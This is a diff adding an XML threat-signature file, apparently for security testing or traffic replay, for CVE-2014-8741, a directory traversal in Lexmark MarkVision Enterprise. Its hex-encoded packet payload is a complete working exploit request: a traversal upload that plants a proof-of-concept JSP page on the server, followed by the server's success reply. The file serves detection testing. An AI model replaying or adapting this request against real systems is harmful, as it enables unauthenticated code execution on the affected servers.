@@ -1,0 +1,86 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="Lexmark MarkVision Enterprise GfdFileUploadServlet Directory Traversal"/>
+    <EngDesc display="true" value="A directory traversal vulnerability exists in Lexmark MarkVision Enterprise. The vulnerability is due to an input validation issue when processing user supplied data used for writing files to the system by the GfdFileUploadServlet servlet. A remote unauthenticated attacker could exploit this vulnerability by sending a malicious request to the server. Successful exploitation could lead to arbitrary code execution under the security context of SYSTEM."/>
+    <Intent display="true">
+      <item value="DIRECTORY_TRAVERSAL"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Severity display="true" value="Critical"/>
+    <Known_Vendors_Affected display="true">
+      <item value="Lexmark"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="MarkVision_Enterprise"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="prior_to_v2.1"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20141216-05"/>
+    <CVEID display="true" value="CVE-2014-8741"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value="115622"/>
+    <Author display="true" value=""/>
+    <ID display="true" value="b32e6e75955cd5b26ac8bd2372225988"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="NETWORK"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="complete"/>
+    <IntegImpact display="false" value="complete"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="635576219037162800"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1422268214" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="C"/>
+    <NamedVar name="destPort" type="ImperfectControls.Port" value="null" index="D"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+    <for index="B">
+      <for index="C"/>
+      <for index="D"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="A0:D3:C1:F1:4A:7D" destMac="00:50:56:B4:1E:C1" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="04A6" Identification="F08B" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="E42A" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="57219" destPort="$destPort" SeqNumber="85317388" AckNumber="7D643D9D" HeaderLength="08" WindowSize="0073" Checksum="1C43" UrgentPointer="0000" Options="0101080AE70C8311006857A8" Payload="504F5354202F6D76652F75706C6F61642F67666420485454502F312E310D0A436F6E74656E742D547970653A206D756C7469706172742F666F726D2D646174613B20626F756E646172793D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D3764653235303166303232340D0A486F73743A203137322E31362E382E3132313A393738380D0A436F6E74656E742D4C656E6774683A203937340D0A0D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D3764653235303166303232340D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D2273756363657373220D0A0D0A77696E646F772E636C6F736528293B2077696E646F772E6F70656E65722E66696C6555706C6F616465642824666E293B0D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D3764653235303166303232340D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D226661696C757265220D0A0D0A77696E646F772E636C6F736528293B2077696E646F772E6F70656E65722E75706C6F61644661696C656428247263293B0D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D3764653235303166303232340D0A436F6E74656E742D446973706F736974696F6E3A20666F726D2D646174613B206E616D653D226461746166696C65223B2066696C656E616D653D222E2E2F2E2E5C2E2E5C646D2D6D76655C706F632E6A7370220D0A436F6E74656E742D547970653A206170706C69636174696F6E2F782D7A69702D636F6D707265737365640D0A0D0A3C2540207061676520696D706F72743D226A6176612E696F2E2A222020253E0D0A3C250D0A537472696E672074657874203D202250726F6F66206F6620436F6E63657074202D20436F707972696768742054454C5553205365637572697479204C616273223B0D0A537472696E67207465787446696C65203D2022433A5C5C706F632E747874223B0D0A747279207B0D0A202020205072696E74577269746572207077203D206E6577205072696E74577269746572286E65772046696C654F757470757453747265616D287465787446696C6529293B0D0A2020202070772E7072696E746C6E2874657874293B0D0A2020202070772E636C6F736528293B0D0A7D20636174636828494F457863657074696F6E206529207B0D0A2020206F75742E7072696E746C6E28652E6765744D6573736167652829293B0D0A7D0D0A253E0D0A3C25206F75742E7072696E746C6E282250726F6F66206F6620436F6E63657074202D20436F707972696768742054454C5553205365637572697479204C6162732E2022293B20253E0D0A3C25206F75742E7072696E746C6E282246696C652027433A5C5C706F632E7478742720686173206265656E2063726561746564206F6E20796F7572206469736B2122293B20253E0D0A2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D2D3764653235303166303232342D2D0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:50:56:B4:1E:C1" destMac="A0:D3:C1:F1:4A:7D" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0165" Identification="6F9C" FragmentOffset="0000" TTL="80" Protocol="06" HeaderChecksum="285B" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$destPort" destPort="57219" SeqNumber="7D643D9D" AckNumber="853177FA" HeaderLength="08" WindowSize="0104" Checksum="476B" UrgentPointer="0000" Options="0101080A00685807E70C8311" Payload="485454502F312E3120323030204F4B0D0A5365727665723A204170616368652D436F796F74652F312E310D0A436F6E74656E742D547970653A20746578742F706C61696E3B636861727365743D49534F2D383835392D310D0A436F6E74656E742D4C656E6774683A203135360D0A446174653A205475652C2032332044656320323031342031363A30333A303020474D540D0A0D0A3C68746D6C3E3C686561643E3C736372697074206C616E67756167653D274A6176615363726970742720747970653D27746578742F6A617661736372697074273E77696E646F772E636C6F736528293B2077696E646F772E6F70656E65722E66696C6555706C6F616465642822706F632D313431393335303538303538332E6A737022293B3C2F7363726970743E3C2F686561643E3C2F68746D6C3E" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
